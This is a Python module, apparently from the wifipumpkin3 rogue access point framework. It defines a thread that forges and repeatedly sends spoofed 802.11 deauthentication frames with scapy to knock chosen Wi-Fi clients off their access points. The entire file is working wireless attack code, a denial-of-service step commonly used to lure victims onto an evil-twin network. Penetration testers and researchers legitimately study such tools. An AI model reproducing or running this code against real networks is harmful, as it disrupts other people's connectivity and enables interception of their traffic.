from scapy.all import *
from PyQt5.QtCore import QThread
from threading import Event
from wifipumpkin3.core.utility.printer import display_messages, setcolor

# This file is part of the wifipumpkin3 Open Source Project.
# wifipumpkin3 is licensed under the Apache 2.0.

# Copyright 2020 P0cL4bs Team - Marcos Bomfim (mh4x0f)

# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at

# http://www.apache.org/licenses/LICENSE-2.0

# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.


class ThreadDeauth(QThread):
    def __init__(self, mac_blacklist, client, interface, frame_limit=0, direction="both"):
        QThread.__init__(self)
        if not 0 <= frame_limit <= 1000 or direction not in ("both", "ap-to-client"):
            raise ValueError("Invalid deauthentication count or direction")
        self._mac_blacklist = tuple(sorted(target.replace("-", ":") for target in mac_blacklist))
        self.client = client.replace("-", ":")
        self.interface = interface
        self.frame_limit = frame_limit
        self.direction = direction
        self.frames_sent = 0
        self.error = None
        self._stop_event = Event()
        self.status = False
        self.pkts = list()

    def build_packetRadioTap(self, bssid, client):
        pkt1 = (
            RadioTap()
            / Dot11(
                type=0,
                subtype=12,
                addr1=client,
                addr2=bssid,
                addr3=bssid,
            )
            / Dot11Deauth(reason=7)
        )
        self.pkts.append(pkt1)
        if self.direction == "both":
            self.pkts.append(RadioTap() / Dot11(type=0, subtype=12, addr1=bssid,
                                               addr2=client, addr3=bssid) / Dot11Deauth(reason=7))

    def run(self):
        print(
            display_messages(
                "starting thread {}".format(setcolor(self.objectName(), color="green")),
                info=True,
            )
        )
        if self._stop_event.is_set():
            return
        self.status = True
        try:
            self.pkts = []
            for target in self._mac_blacklist:
                self.build_packetRadioTap(target, self.client)
            while self.pkts and not self._stop_event.is_set():
                for packet in self.pkts:
                    if self._stop_event.is_set() or (self.frame_limit and self.frames_sent >= self.frame_limit):
                        return
                    sendp(packet, verbose=False, count=1, iface=self.interface)
                    self.frames_sent += 1
                    if self.frame_limit and self.frames_sent < self.frame_limit:
                        self._stop_event.wait(0.1)
        except Exception as error:
            self.error = str(error)
            print(display_messages("Deauth worker failed: " + self.error, error=True))
        finally:
            self.status = False

    def stop(self):
        self._stop_event.set()
        self.status = False
        print(
            display_messages(
                "thread {} successfully stopped".format(self.objectName()), info=True
            )
        )
